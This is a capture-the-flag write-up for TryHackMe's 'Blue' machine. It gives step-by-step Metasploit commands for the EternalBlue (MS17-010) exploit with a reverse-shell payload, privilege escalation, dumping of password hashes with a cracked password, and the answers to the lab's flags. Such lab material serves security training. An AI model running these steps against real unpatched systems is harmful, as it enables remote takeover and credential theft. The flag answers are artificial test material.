# **Blue**

### Summary
* This is a writeup of the vulnerable machine 'Blue' on the website TryHackMe. This machine is vulnerable with the EternalBlue exploit. The EternalBlue exploit is a malicious attack that allows a threat agent to remotely execute arbitrary code to gain access to a network by sending speially crafted packets.

#### EternalBlue 
* This exploits a software vulnerability in the Windows OS SMBv1 protocol.
* The SMB protocol is a network file sharing protocol that allows access to files on a remote server.
* EternalBlue has the ability to compromise networks, which means that if one devices is infected then every device connected to the network is at risk.
* To Learn more information about EternalBlue: https://www.cisecurity.org/wp-content/uploads/2019/01/Security-Primer-EternalBlue.pdf
* MS17-010: https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010

#### WannaCry Ransomware
* Ransomware is an attack where access to the system and data is blocked until a ransom is paid, normally being paid in cryptocurrency.

The WannaCry ransomware attack was a global cyber attack that took place in May 2017. This attack hit around 230,000 computers globally. One of the first companies that was hit was a Spanish mobile company called Telefonica. Not long after, thousands of NHS hospitals and surgeries across the UK were affected.

According to security researcher Marcus Hutchins, the ransomware attack acting almost like a worm. It was replicating itself and spreading to nodes across the network.

What was very terrfying about this attack is that **ambulances were reportedly rerouted, leaving peope in need of urgent care**. It cost the NHS £92 million after 19,000 appointments were canceled as a result from the attack.

This attack spread and crippled computer systems in 150 countries. **Overall the WannaCry ransomware attack had a huge impact worldwide; it is estimated that this cybercrime caused $4 Billion in losses across the globe**.

To find more information check out this article by Kaspersky: https://usa.kaspersky.com/resource-center/threats/ransomware-wannacry

---

Now that we have some background information and we have some knowledge of how this attack can have a real world impact. **Let's get to hacking!**


#### Task 1: Recon

**Q1: Scan the machine**
* `sudo nmap -Pn -vv -T4 -oN blue_scan 10.10.34.14`

*To see the result of the scan, look at the file blue_scan in the nmap folder.*

From our first scan we were able to find that the port 445 is open and is running SMB on windows 7 professional with service pack 1.

```
445/tcp   open  microsoft-ds       syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```

```
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-07-31T11:33:02-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-31T16:33:02
|_  start_date: 2021-07-31T15:24:47
````

From this information we could do some research to check if there is a vulnerability for this OS on this port. Since we already know the exploit on this machine we do not need to do this. This nmap script when ran will scan the target for the EternalBlue. This is not needed, but nice to know you can run scripts like this.

* `sudo nmap -Pn --script=smb-vuln-ms17-010 -oN nmap/blue_script 10.10.34.14`

*To see the results of this scan, look at the file blue_script in the nmap folder.*

**Q2: How many ports are open with a port number under 1000?**
* Within our nmap scan we performed earlier we were able to see the ports open on the network. **There were 3 ports open under 1000.**

```
PORT      STATE SERVICE            REASON          VERSION
135/tcp   open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```

**Q3: What is the machine vulnerable to? (Answer in the form of: ms??-???, ex: ms-08-067)**
* Read in the earlier section, "EternalBlue", to find the answer.

---

#### Task 2: Gain Access

**Q1: Start Metasploit**
* `msfconsole`

**Q2: Find the exploitation code we will run against the machine. What is the full path of the code?**

Since we already know what the vulnerablity is, EternalBlue, we can use the search function within metasploit to find the code.

* `search eternalblue`
```
msf6 > search eternalblue

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   3  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   4  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 5, use 5 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > 
```
The one we are looking for is **exploit/windows/smb/ms17_010_eternalblue**.

**Q3: Show options and set the one required value. What is the name of this value? (All caps for submission)**

Now that we have found the code needed we need to select and configure it.

type the command: `use 0`

Now that the code is selected lets configure it.

type the command: `show options`

The required value needed is **RHOSTS**. 

type the command: `set rhosts <ip_address_of_machine>`
type the command: `set payload windows/x64/shell/reverse_tcp`

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         <machine_ip>     yes       The target host(s), range CIDR identifier, or hos
                                             ts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authenti
                                             cation. Only affects Windows Server 2008 R2, Wind
                                             ows 7, Windows Embedded Standard 7 target machine
                                             s.
   SMBPass                         no        (Optional) The password for the specified usernam
                                             e
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Targ
                                             et. Only affects Windows Server 2008 R2, Windows
                                             7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only a
                                             ffects Windows Server 2008 R2, Windows 7, Windows
                                              Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, no
                                        ne)
   LHOST     <your_ip>        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

**Now all that is left is to run the exploit.**
* Type the command: `run`

---

#### Task 3: Escalate

**Q1: What is the name of the post module we will use?**
* in msfconsole type the command:`search shell_to_meterpreter`

Select the module: `post/multi/manage/shell_to_meterpreter`

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter

msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

**Q2: What option are we required to change?**
* `show options`

The option needed to be configured is **Session**.

**Q3: Set the required option.**

In order to know which session needs to be escalated. we can type the command:
* `sessions -l`

now that we know what session needs to be escalated. set the required option:
* `set session <session_number>`

```
msf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connectio
                                       n
   LHOST                     no        IP of host that will receive the connection from the pa
                                       yload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.

msf6 post(multi/manage/shell_to_meterpreter) > 
```

**RUN THE EXPLOIT**

**Q4: Once the meterpreter shell conversion completes, select that session for use.**
* You can select this by using the command: `sessions <session_number>`

**Q5: Verify that we have escalated to 'NT AUTHORITY\SYSTEM'**
* Run the command: `getsystem`

*The process that I migrated to is the winlogon.exe process. Which had the process number 660.*

#### Task 4: Cracking

**Q1: What is the name of the non-default user?**
* run the command: `hashdump`
```
meterpreter > migrate 660
[*] Migrating from 1312 to 660...
[*] Migration completed successfully.
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
meterpreter > 
```
The user is **Jon**.

**Q2: What is the cracked password?**

Copy `ffb43f0de35be4d9917ac0cc8ad57f8d` from beside Jon:1000:

you can use crackstation a website to crack this hash.

the password is `alqfna22`

#### Task 5: Find Flags!

**Flag 1**

In order to find this shell we will need to run the `shell` command tool in the meterpreter shell we popped earlier. This will give us a normal windows shell, so that we can run windows commands and explore the file system.

now that we have a windows shell. 

type the command: `cd \`

now type the command: `dir`

```
C:\Windows\system32>cd \
cd \

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\

03/17/2019  02:27 PM                24 flag1.txt
07/13/2009  10:20 PM    <DIR>          PerfLogs
04/12/2011  03:28 AM    <DIR>          Program Files
03/17/2019  05:28 PM    <DIR>          Program Files (x86)
12/12/2018  10:13 PM    <DIR>          Users
03/17/2019  05:36 PM    <DIR>          Windows
               1 File(s)             24 bytes
               5 Dir(s)  21,103,452,160 bytes free

C:\> 
```
we found the first flag now lets find out what it is?

type the command: `type flag1.txt`

```
C:\>type flag1.txt
type flag1.txt
flag{access_the_machine}
C:\>
```

*the flag is flag{access_the_machine}*

**Flag 2**

this flag is stored at the location where passwords are stored within windows.

this will be found in the `config` folder in Windows 

type the command: `cd C:\Windows\System32\config`

now type `dir`

```
C:\Windows\System32\config>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Windows\System32\config

08/01/2021  05:46 PM    <DIR>          .
08/01/2021  05:46 PM    <DIR>          ..
12/12/2018  06:00 PM            28,672 BCD-Template
08/01/2021  05:56 PM        18,087,936 COMPONENTS
08/01/2021  05:55 PM           262,144 DEFAULT
03/17/2019  02:32 PM                34 flag2.txt
07/13/2009  09:34 PM    <DIR>          Journal
03/17/2019  02:56 PM    <DIR>          RegBack
03/17/2019  03:05 PM           262,144 SAM
08/01/2021  05:56 PM           262,144 SECURITY
08/01/2021  05:57 PM        40,632,320 SOFTWARE
08/01/2021  05:55 PM        12,582,912 SYSTEM
11/20/2010  09:41 PM    <DIR>          systemprofile
12/12/2018  06:03 PM    <DIR>          TxR
               8 File(s)     72,118,306 bytes
               6 Dir(s)  20,807,516,160 bytes free

C:\Windows\System32\config>

```

*the flag is flag{sam_database_elevated_access}*

**Flag 3**

this next flag will be need to be in an elevated environment so lets move back to our meterpreter shell.

now type the command `cd C:/` 

now lets search to find the last flag.

type the command: `search -f flag*.txt`

the third flag is located at `c:\Users\Jon\Documents\flag3.txt`

type the command: `cd Users\Jon\Documents\flag3.txt`

*the flag is flag {admin_documents_can_be_valuable}*

---
